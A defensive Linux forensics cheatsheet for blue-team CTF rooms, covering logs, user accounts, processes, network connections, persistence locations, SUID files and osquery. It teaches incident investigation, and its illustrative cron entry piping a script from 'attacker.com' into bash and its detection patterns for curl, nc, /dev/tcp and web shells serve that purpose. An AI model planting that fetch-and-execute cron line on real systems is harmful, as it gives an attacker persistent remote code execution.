# 🛡️ Blue Team CTF - Linux Investigation Cheatsheet

> **A comprehensive guide for tackling Blue Team CTF Linux investigation rooms on platforms like TryHackMe**

---

## 📋 Table of Contents

1. [Initial Investigation Approach](#1-initial-investigation-approach)
2. [Critical Log Locations](#2-critical-log-locations)
3. [User Account Investigation](#3-user-account-investigation)
4. [Process & Network Analysis](#4-process--network-analysis)
5. [Persistence Mechanisms](#5-persistence-mechanisms)
6. [Privilege Escalation Artifacts](#6-privilege-escalation-artifacts)
7. [File System Investigation](#7-file-system-investigation)
8. [Useful Investigation Tools](#8-useful-investigation-tools)
9. [When You're Stuck - Troubleshooting Guide](#9-when-youre-stuck---troubleshooting-guide)
10. [Quick Reference Commands](#10-quick-reference-commands)

---

## 1. Initial Investigation Approach

### 🎯 General Methodology

When you first start a Linux investigation room, follow this systematic approach:

#### **Step 1: Understand the Scenario**
- Read the room description carefully
- Note what type of incident you're investigating (breach, malware, insider threat, etc.)
- Identify your objectives and questions to answer

#### **Step 2: Gain Access & Elevate if Needed**
```bash
# Switch to root for full access
sudo su

# Or run individual commands with sudo
sudo [command]
```

#### **Step 3: Initial Triage - The "Big Five" Areas**

Follow this priority order for investigation:

1. **Processes** - Suspicious running processes
2. **Network** - Unusual network connections
3. **Users** - Unauthorized or suspicious user accounts
4. **Logs** - Evidence of tampering or malicious activity
5. **Files/Directories** - Malicious payloads or hidden files

#### **Step 4: Document Everything**
- Take notes of suspicious findings
- Record timestamps
- Save command outputs for correlation
- Create a timeline of events

---

## 2. Critical Log Locations

### 📂 Essential Log Files

Logs are your primary source of evidence. Here's where to look:

### **Authentication & Security Logs**

| Log File | Distribution | Purpose |
|----------|-------------|---------|
| `/var/log/auth.log` | Debian/Ubuntu | All authentication attempts, sudo usage, SSH logins |
| `/var/log/secure` | RHEL/CentOS | Same as auth.log for RedHat-based systems |
| `/var/log/btmp` | All | Failed login attempts (use `lastb -f /var/log/btmp`) |
| `/var/log/wtmp` | All | Successful logins/logouts (use `last -f /var/log/wtmp`) |
| `/var/log/lastlog` | All | Most recent user logins |

### **System Logs**

| Log File | Purpose |
|----------|---------|
| `/var/log/syslog` | General system messages (Debian/Ubuntu) |
| `/var/log/messages` | General system messages (RHEL/CentOS) |
| `/var/log/kern.log` | Kernel messages |
| `/var/log/dmesg` | Boot and hardware messages |

### **Application Logs**

| Log File | Purpose |
|----------|---------|
| `/var/log/apache2/access.log` | Apache web server access logs |
| `/var/log/apache2/error.log` | Apache error logs |
| `/var/log/nginx/access.log` | Nginx access logs |
| `/var/log/nginx/error.log` | Nginx error logs |

### **Package Management Logs**

| Log File | Distribution | Purpose |
|----------|-------------|---------|
| `/var/log/dpkg.log` | Debian/Ubuntu | Package installations/removals |
| `/var/log/yum.log` | RHEL/CentOS | Package management activities |
| `/var/log/apt/history.log` | Debian/Ubuntu | APT package history |

### **Cron Job Logs**

```bash
/var/log/cron        # RHEL/CentOS
/var/log/cron.log    # Debian/Ubuntu
```

### 🔍 How to Search Logs Effectively

```bash
# View recent log entries
tail -n 100 /var/log/auth.log

# Follow logs in real-time (on live system)
tail -f /var/log/syslog

# Search for specific patterns
grep -i "failed password" /var/log/auth.log

# Search with case insensitivity and show line numbers
grep -in "error" /var/log/syslog

# Search for multiple patterns
grep -E "failed|error|denied" /var/log/auth.log

# Search all logs for an IP address
grep -r "192.168.1.100" /var/log/

# View auth logs with timestamps
cat /var/log/auth.log | grep "sudo"

# Search for user creation events
grep -i "useradd\|adduser" /var/log/auth.log

# Find SSH login attempts
grep "sshd" /var/log/auth.log

# Look for privilege escalation
grep "sudo" /var/log/auth.log | grep -i "COMMAND"
```

### **Systemd Journal (Modern Systems)**

```bash
# View all logs
journalctl

# Show logs for specific service
journalctl -u ssh.service

# View kernel messages
journalctl -k

# Show logs since specific time
journalctl --since "2024-01-15 10:00:00"

# Show logs for specific user
journalctl _UID=1000

# List all boots
journalctl --list-boots

# View logs from specific boot (0 = current, -1 = previous)
journalctl -b 0
```

---

## 3. User Account Investigation

### 👥 User Account Files

| File | Purpose | Permissions |
|------|---------|-------------|
| `/etc/passwd` | User account information (publicly readable) | 644 |
| `/etc/shadow` | Encrypted passwords and password policies | 640 or 600 (root only) |
| `/etc/group` | Group information | 644 |
| `/etc/sudoers` | Sudo privileges configuration | 440 |

### **Investigating /etc/passwd**

```bash
# View all users
cat /etc/passwd

# Look for users with UID 0 (only root should have this!)
awk -F: '$3 == 0 {print $1}' /etc/passwd

# Find users with login shells
grep -v "nologin\|false" /etc/passwd

# Check for suspicious home directories
cat /etc/passwd | grep "/home/"

# Display in readable format
cat /etc/passwd | column -t -s :
```

**Format of /etc/passwd:**
```
username:x:UID:GID:comment:home_directory:shell
```

### **Investigating /etc/shadow**

```bash
# View password hashes (requires root)
sudo cat /etc/shadow

# Check for users without passwords (!)
sudo grep ":\!" /etc/shadow

# Look for recently changed passwords
sudo cat /etc/shadow | awk -F: '{print $1, $3}'

# Verify integrity
sudo pwck -r /etc/shadow
```

**Format of /etc/shadow:**
```
username:$6$encrypted_password:last_change:min_days:max_days:warn:inactive:expire:reserved
```

### **Checking Sudo Access**

```bash
# View sudoers file
cat /etc/sudoers

# Check sudoers.d directory for additional configs
ls -la /etc/sudoers.d/

# View sudo logs from auth.log
grep "sudo" /var/log/auth.log

# Check who can run sudo
getent group sudo
```

### **SSH Authorized Keys (Persistence)**

```bash
# Check root's authorized SSH keys
cat /root/.ssh/authorized_keys

# Check all users' SSH keys
for user_home in /home/*; do
    if [ -f "$user_home/.ssh/authorized_keys" ]; then
        echo "=== $user_home/.ssh/authorized_keys ==="
        cat "$user_home/.ssh/authorized_keys"
    fi
done

# Check SSH known hosts
cat ~/.ssh/known_hosts
```

### **User Activity - Bash History**

```bash
# View root bash history
cat /root/.bash_history

# Check all users' bash history
for user_home in /home/*; do
    if [ -f "$user_home/.bash_history" ]; then
        echo "=== $user_home/.bash_history ==="
        cat "$user_home/.bash_history"
    fi
done

# Look for suspicious commands
grep -E "wget|curl|nc|bash -i|/dev/tcp" /root/.bash_history
```

**Note:** Bash history has limitations:
- Commands are only written when terminal closes
- Can be cleared with `history -c` or `rm ~/.bash_history`
- Doesn't include timestamps by default
- Check `$HISTCONTROL` variable (set to `ignoreboth` or `ignoredups`)

---

## 4. Process & Network Analysis

### 🔄 Process Investigation

### **List Running Processes**

```bash
# Standard process listing
ps aux
# a = all users
# u = user-oriented format
# x = processes without controlling terminal

# Tree view showing parent-child relationships
ps auxf
pstree

# Process with full command line
ps -ef

# Search for specific process
ps aux | grep -i "suspicious"

# Sort by CPU usage
ps aux --sort=-%cpu | head -20

# Sort by memory usage
ps aux --sort=-%mem | head -20
```

### **Identify Suspicious Processes**

```bash
# Look for processes running from /tmp or /dev/shm (common malware locations)
ps aux | grep -E "/tmp|/dev/shm"

# Check processes not associated with terminal
ps aux | awk '$7 == "?"'

# Find processes where binary has been deleted (common in malware)
ls -la /proc/*/exe 2>/dev/null | grep deleted
```

### **Process Details with lsof**

```bash
# List open files for specific process
lsof -p [PID]

# Find which process is using a specific file
lsof /path/to/file

# List all network connections
lsof -i

# Find process using specific port
lsof -i :22
lsof -i :80
```

### **Examine Process Libraries**

```bash
# Check libraries loaded by a process
ldd /proc/[PID]/exe

# View memory maps
cat /proc/[PID]/maps

# Check command line used to start process
cat /proc/[PID]/cmdline | tr '\0' ' '
```

---

### 🌐 Network Investigation

### **Active Connections with netstat**

```bash
# Show all TCP/UDP connections
netstat -tunap
# t = TCP
# u = UDP
# n = numeric (don't resolve names)
# a = all
# p = show process/PID

# Show only listening ports
netstat -tulnp

# Show established connections
netstat -tnp | grep ESTABLISHED

# Find which process is using a specific port
netstat -tulnp | grep :22
```

### **Active Connections with ss (Modern Alternative)**

```bash
# Show all TCP connections
ss -tunap

# Show listening sockets
ss -tulnp

# Show established connections
ss -tn state established

# Filter by specific port
ss -tunap | grep :80

# Show processes for all sockets
ss -p

# Show summary statistics
ss -s
```

### **Investigate Suspicious Connections**

```bash
# Look for connections to unusual ports
ss -tunap | grep -v ":22\|:80\|:443"

# Check for connections to external IPs
ss -tunap | grep -v "127.0.0.1\|0.0.0.0"

# Find reverse shells (common ports: 4444, 4445, 1234, etc.)
ss -tunap | grep -E ":4444|:4445|:1234|:9001"
```

### **ARP Table**

```bash
# View ARP table
arp -a
ip neighbor show
```

### **Routing Table**

```bash
# Display routing table
route -n
ip route show
```

---

## 5. Persistence Mechanisms

Attackers establish persistence to maintain access after reboot. Check these locations:

### 🔁 Cron Jobs

Cron jobs allow scheduled task execution - a favorite persistence method.

### **System-Wide Cron Jobs**

```bash
# Main crontab file
cat /etc/crontab

# Cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Check contents of cron.d
cat /etc/cron.d/*
```

### **User-Specific Cron Jobs**

```bash
# List current user's crontab
crontab -l

# List crontab for specific user
crontab -l -u username

# Check all user crontabs
for user in $(cut -f1 -d: /etc/passwd); do 
    echo "=== Crontab for $user ==="
    crontab -u $user -l 2>/dev/null
done

# Crontab files location
ls -la /var/spool/cron/crontabs/
cat /var/spool/cron/crontabs/*
```

### **Understanding Cron Syntax**

```
* * * * * command_to_execute
│ │ │ │ │
│ │ │ │ └─── Day of week (0-7, Sunday = 0 or 7)
│ │ │ └───── Month (1-12)
│ │ └─────── Day of month (1-31)
│ └───────── Hour (0-23)
└─────────── Minute (0-59)
```

**Example suspicious cron:**
```bash
* * * * * /bin/bash -c '/tmp/backdoor.sh'    # Runs every minute
*/5 * * * * curl http://attacker.com/shell.sh | bash    # Every 5 minutes
```

### **At Jobs (One-time scheduled tasks)**

```bash
# List at jobs
atq

# View specific at job
at -c [job_number]

# At job files
ls -la /var/spool/cron/atjobs/
```

---

### ⚙️ Systemd Services & Timers

Modern Linux systems use systemd for service management.

### **List Services**

```bash
# List all services
systemctl list-unit-files --type=service

# List running services
systemctl list-units --type=service --state=running

# List enabled services (auto-start)
systemctl list-unit-files --type=service --state=enabled

# Check specific service status
systemctl status [service_name]
```

### **Service File Locations**

```bash
# System-wide services
ls -la /etc/systemd/system/
ls -la /lib/systemd/system/
ls -la /usr/lib/systemd/system/

# User-specific services
ls -la /home/*/.config/systemd/user/

# Runtime services
ls -la /run/systemd/system/
```

### **Investigate Suspicious Services**

```bash
# View service file contents
cat /etc/systemd/system/[service_name].service

# Look for recently modified service files
find /etc/systemd/system/ -type f -mtime -7

# Check for services with suspicious names
ls /etc/systemd/system/*.service | grep -E "update|backup|sync|cron"
```

### **Systemd Timers (Like Cron)**

```bash
# List all timers
systemctl list-timers --all

# View timer configuration
systemctl cat [timer_name].timer
```

### **Service File Anatomy**

```ini
[Unit]
Description=Suspicious Service
After=network.target

[Service]
ExecStart=/path/to/malicious/script
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
```

---

### 🚀 Init Scripts & RC Files

Older systems use init scripts for startup.

```bash
# Init scripts (older systems)
ls -la /etc/init.d/

# Run level directories
ls -la /etc/rc*.d/

# User profile scripts (executed at login)
cat /etc/profile
cat /etc/bash.bashrc
cat ~/.bashrc
cat ~/.bash_profile
cat ~/.profile
```

---

### 🔌 Other Persistence Locations

```bash
# System-wide environment
cat /etc/environment

# PAM modules (authentication)
ls -la /etc/pam.d/

# Preload libraries (LD_PRELOAD rootkits)
cat /etc/ld.so.preload

# Kernel modules
lsmod
ls -la /lib/modules/$(uname -r)/

# Check for suspicious modules
lsmod | grep -v "common_module_names"
```

---

## 6. Privilege Escalation Artifacts

### 🔓 Signs of Privilege Escalation

### **SUID/SGID Files**

SUID (Set User ID) allows files to run with owner's privileges - often exploited for privilege escalation.

```bash
# Find all SUID files
find / -perm -4000 -type f 2>/dev/null

# Find all SGID files
find / -perm -2000 -type f 2>/dev/null

# Find both SUID and SGID
find / -perm -6000 -type f 2>/dev/null

# Compare with known good list
find / -perm -4000 -type f 2>/dev/null | diff - known_suid_files.txt

# Check for suspicious SUID binaries
find / -perm -4000 -type f 2>/dev/null | grep -E "nmap|vim|find|bash|python"
```

### **Sudo Configuration Issues**

```bash
# Check sudo version (older versions have vulnerabilities)
sudo -V

# Check what current user can run with sudo
sudo -l

# Review sudoers file for misconfigurations
cat /etc/sudoers
cat /etc/sudoers.d/*

# Look for NOPASSWD entries
grep NOPASSWD /etc/sudoers
```

### **World-Writable Files**

```bash
# Find world-writable files
find / -perm -002 -type f 2>/dev/null

# Find world-writable directories
find / -perm -002 -type d 2>/dev/null

# Exclude /proc and /sys
find / -path /proc -prune -o -path /sys -prune -o -perm -002 -type f 2>/dev/null
```

### **Capabilities (Modern Alternative to SUID)**

```bash
# Find files with capabilities set
getcap -r / 2>/dev/null

# Check specific file
getcap /path/to/file

# Look for dangerous capabilities
getcap -r / 2>/dev/null | grep -E "cap_setuid|cap_sys_admin"
```

### **Kernel Exploits**

```bash
# Check kernel version
uname -a
uname -r

# Check for known vulnerable kernels
searchsploit linux kernel $(uname -r)

# Look for DirtyCow, DirtyPipe indicators
dmesg | grep -i "dirty"
```

### **Check for Privilege Escalation in Logs**

```bash
# Sudo usage
grep "sudo" /var/log/auth.log

# User switching
grep "su:" /var/log/auth.log

# Check for escalation to root
grep "root" /var/log/auth.log | grep -i "session"
```

---

## 7. File System Investigation

### 📁 Suspicious File Locations

Attackers often hide files in these locations:

### **Common Hiding Spots**

```bash
# Temporary directories
ls -la /tmp/
ls -la /var/tmp/
ls -la /dev/shm/

# Hidden directories in root
ls -la /

# Web server directories
ls -la /var/www/
ls -la /var/www/html/

# Optional software location
ls -la /opt/

# User downloads
ls -la /home/*/Downloads/
```

### **Finding Hidden Files**

```bash
# Show all hidden files (starting with .)
find / -name ".*" -type f 2>/dev/null

# Hidden directories
find / -name ".*" -type d 2>/dev/null

# Files with unusual names (e.g., spaces, special characters)
find / -name "* *" 2>/dev/null
find / -name "*;*" 2>/dev/null

# Zero-width or unicode characters in filenames
ls -la | cat -A
```

### **Recently Modified Files**

```bash
# Files modified in last 24 hours
find / -mtime -1 -type f 2>/dev/null

# Files modified in last 7 days
find / -mtime -7 -type f 2>/dev/null

# Files modified between dates
find / -newermt "2024-01-01" ! -newermt "2024-01-07" 2>/dev/null

# Recently accessed files
find / -atime -1 2>/dev/null
```

### **File Analysis**

```bash
# Determine file type (doesn't rely on extension)
file /path/to/suspicious_file

# Calculate hash
md5sum /path/to/file
sha256sum /path/to/file

# Check file timestamps
stat /path/to/file

# View file metadata
ls -li /path/to/file  # Shows inode number
```

### **Analyze File Contents**

```bash
# Extract strings from binary
strings /path/to/binary

# View hex dump
xxd /path/to/file | less

# Search for specific content
grep -r "password" /home/

# Find files containing specific text
find / -type f -exec grep -l "malicious_string" {} \; 2>/dev/null
```

### **Large Files (Data Exfiltration)**

```bash
# Find files larger than 100MB
find / -size +100M -type f 2>/dev/null

# Find files larger than 1GB
find / -size +1G -type f 2>/dev/null

# Sort by size
du -ah / 2>/dev/null | sort -rh | head -20
```

### **Web Server Forensics**

```bash
# Look for web shells
find /var/www/ -name "*.php" -type f
grep -r "eval\|base64_decode\|system\|exec" /var/www/

# Check for recently uploaded files
find /var/www/ -type f -mtime -7

# Look for suspicious permissions
find /var/www/ -perm -002 -type f
```

---

## 8. Useful Investigation Tools

### 🔧 OSQuery - SQL-Powered System Monitoring

OSQuery allows you to query system information using SQL syntax.

### **Starting osquery**

```bash
# Interactive mode
osqueryi

# Run specific query
osqueryi "SELECT * FROM users;"

# JSON output
osqueryi --json "SELECT * FROM users;"
```

### **Useful osquery Queries**

```sql
-- List all users
SELECT * FROM users;

-- Show running processes
SELECT * FROM processes;

-- Network connections
SELECT * FROM process_open_sockets;

-- Listening ports
SELECT * FROM listening_ports;

-- Installed packages
SELECT * FROM deb_packages;  -- Debian/Ubuntu
SELECT * FROM rpm_packages;  -- RHEL/CentOS

-- Cron jobs
SELECT * FROM crontab;

-- Kernel modules
SELECT * FROM kernel_modules;

-- SUID binaries
SELECT * FROM suid_bin;

-- Process with network connections
SELECT p.pid, p.name, p.path, s.local_port, s.remote_address 
FROM processes p 
JOIN process_open_sockets s ON p.pid = s.pid;

-- Check for deleted binaries still running
SELECT * FROM processes WHERE on_disk = 0;

-- User login history
SELECT * FROM logged_in_users;

-- File hashes
SELECT path, md5 FROM hash WHERE path = '/etc/passwd';
```

### **osquery for Persistence**

```sql
-- System startup items
SELECT * FROM startup_items;

-- Cron jobs across all users
SELECT * FROM crontab;

-- Kernel modules
SELECT * FROM kernel_modules;
```

---

### 🔍 Other Essential Tools

### **grep - Pattern Searching**

```bash
# Basic search
grep "pattern" file.txt

# Case-insensitive
grep -i "pattern" file.txt

# Recursive search in directory
grep -r "pattern" /var/log/

# Show line numbers
grep -n "pattern" file.txt

# Multiple patterns (OR)
grep -E "pattern1|pattern2" file.txt

# Invert match (NOT)
grep -v "pattern" file.txt

# Count matches
grep -c "pattern" file.txt

# Show context (before/after lines)
grep -A 5 -B 5 "pattern" file.txt
```

### **find - File System Search**

```bash
# Find by name
find / -name "filename" 2>/dev/null

# Case-insensitive name search
find / -iname "filename" 2>/dev/null

# Find by type
find / -type f  # files
find / -type d  # directories

# Find by permissions
find / -perm 777

# Find and execute command
find / -name "*.log" -exec cat {} \;

# Find by size
find / -size +10M  # larger than 10MB

# Find by modification time
find / -mtime -1  # last 24 hours
```

### **awk - Text Processing**

```bash
# Print specific columns
awk '{print $1, $3}' file.txt

# Filter based on condition
awk '$3 > 100' file.txt

# Field separator
awk -F: '{print $1}' /etc/passwd
```

### **sed - Stream Editor**

```bash
# Replace text
sed 's/old/new/' file.txt

# Delete lines matching pattern
sed '/pattern/d' file.txt
```

### **Rootkit Detection Tools**

```bash
# Check for rootkits with chkrootkit
sudo chkrootkit

# Scan with rkhunter
sudo rkhunter --check

# Update rkhunter database
sudo rkhunter --update
```

### **Malware Scanning**

```bash
# ClamAV scan
clamscan -r /home/

# Update signatures
freshclam

# Linux Malware Detect
maldet -a /var/www/
```

---

## 9. When You're Stuck - Troubleshooting Guide

### 🆘 Strategies When Investigation Stalls

### **1. Go Back to Basics**

```bash
# Re-read the scenario
# What type of attack is described?
# What are the specific questions asking?

# Start with the timeline
# When did the incident occur?
# What was the first indication?
```

### **2. Expand Your Search Scope**

If you can't find evidence in obvious places, try:

```bash
# Search entire filesystem for keywords
grep -r "suspicious_term" / 2>/dev/null

# Look for ALL recently modified files
find / -mtime -7 -ls 2>/dev/null

# Check less common log locations
find /var -name "*.log" -type f 2>/dev/null

# Review all user directories
for dir in /home/*; do echo "=== $dir ==="; ls -la $dir; done
```

### **3. Cross-Reference Multiple Sources**

```bash
# Correlate timestamps between:
# - Log files
# - File modification times
# - Process start times
# - Network connection times

# Example: Find all activity from a specific time
grep "Jan 15 14:00" /var/log/auth.log
find / -newermt "2024-01-15 14:00:00" ! -newermt "2024-01-15 15:00:00" 2>/dev/null
```

### **4. Ask Different Questions**

Instead of "Where is the malware?" ask:

- What processes are running that shouldn't be?
- What network connections exist that are unusual?
- What files were created around the incident time?
- What user accounts exist that shouldn't?
- What persistence mechanisms have been established?

### **5. Check Configuration Files**

Many answers lie in configuration files:

```bash
# Web server configs
cat /etc/apache2/apache2.conf
cat /etc/nginx/nginx.conf

# Service configs
ls -la /etc/systemd/system/
cat /etc/ssh/sshd_config

# Application configs in /etc
find /etc -name "*.conf" -type f
```

### **6. Use Alternative Commands**

If one command doesn't work, try alternatives:

**For processes:**
- `ps aux` → `top` → `htop` → `pgrep`

**For network:**
- `netstat` → `ss` → `lsof -i` → `osquery`

**For users:**
- `cat /etc/passwd` → `getent passwd` → `osquery`

### **7. Look for Anti-Forensics**

Attackers may try to hide their tracks:

```bash
# Check if logs have been cleared
ls -lah /var/log/  # Look for 0-byte files or recent modifications

# Check for log tampering
stat /var/log/auth.log

# Look for cleared bash history
stat ~/.bash_history
cat ~/.bash_history | wc -l

# Check if HISTFILE is disabled
echo $HISTFILE
echo $HISTFILESIZE

# Check for rootkits hiding files
ls -la vs. stat /path/to/file
```

### **8. Remember the "Big Five" Priority**

When completely stuck, systematically go through:

1. **Processes** → `ps aux`, `pstree`, `lsof`
2. **Network** → `netstat -tunap`, `ss -tunap`
3. **Users** → `/etc/passwd`, `/etc/shadow`, bash histories
4. **Logs** → `/var/log/*`, `journalctl`
5. **Files** → `find` commands, `ls` in suspicious directories

### **9. Read Tool Output Carefully**

```bash
# Use less for long output
command | less

# Redirect output to file for analysis
command > output.txt

# Count results
command | wc -l

# Sort and unique
command | sort | uniq
```

### **10. Check the Room Hints**

- Many TryHackMe rooms have hints
- Read other tasks for context clues
- Check room description for tool mentions

---

## 10. Quick Reference Commands

### ⚡ Essential One-Liners

### **Initial Triage**

```bash
# System information
uname -a                    # Kernel version
hostname                    # System name
date                        # Current date/time
uptime                      # System uptime
last                        # Login history
w                           # Currently logged in users
```

### **User Investigation**

```bash
cat /etc/passwd             # All users
awk -F: '$3 == 0 {print}' /etc/passwd  # UID 0 users (should only be root)
grep "/bin/bash" /etc/passwd           # Users with shell access
cat /root/.bash_history     # Root command history
```

### **Process & Network**

```bash
ps aux                      # All processes
ps auxf                     # Process tree
netstat -tunap              # All network connections
ss -tunap                   # Modern network connections
lsof -i                     # Network connections
```

### **Persistence**

```bash
cat /etc/crontab            # System cron
crontab -l                  # User cron
systemctl list-unit-files --type=service  # All services
cat /etc/rc.local           # Startup script (older systems)
```

### **File System**

```bash
find / -mtime -1 2>/dev/null           # Files modified last 24h
find / -perm -4000 2>/dev/null         # SUID files
find / -name ".*" -type f 2>/dev/null  # Hidden files
ls -la /tmp /var/tmp /dev/shm          # Temp directories
```

### **Logs**

```bash
tail -100 /var/log/auth.log            # Recent auth events
grep "Failed password" /var/log/auth.log  # Failed logins
grep "sudo" /var/log/auth.log          # Sudo usage
journalctl -u ssh.service              # SSH service logs
```

---

## 📚 Additional Tips

### **Good Practices for CTF Rooms**

1. **Take Screenshots** - Document your findings
2. **Create a Timeline** - Track events chronologically
3. **Use Multiple Terminals** - Have logs open in one, commands in another
4. **Copy Important Output** - Save to files for later reference
5. **Read Error Messages** - They often contain clues
6. **Try Root Access** - Many investigation commands require `sudo`

### **Common Pitfalls to Avoid**

- ❌ Not reading the scenario carefully
- ❌ Forgetting to use `sudo` for privileged commands
- ❌ Overlooking timestamp information
- ❌ Not checking multiple log sources
- ❌ Giving up on finding persistence mechanisms
- ❌ Ignoring service configurations


---
*Remember: Persistence pays off. If you're stuck, take a break and come back with fresh eyes. Every expert was once a beginner who didn't give up.*
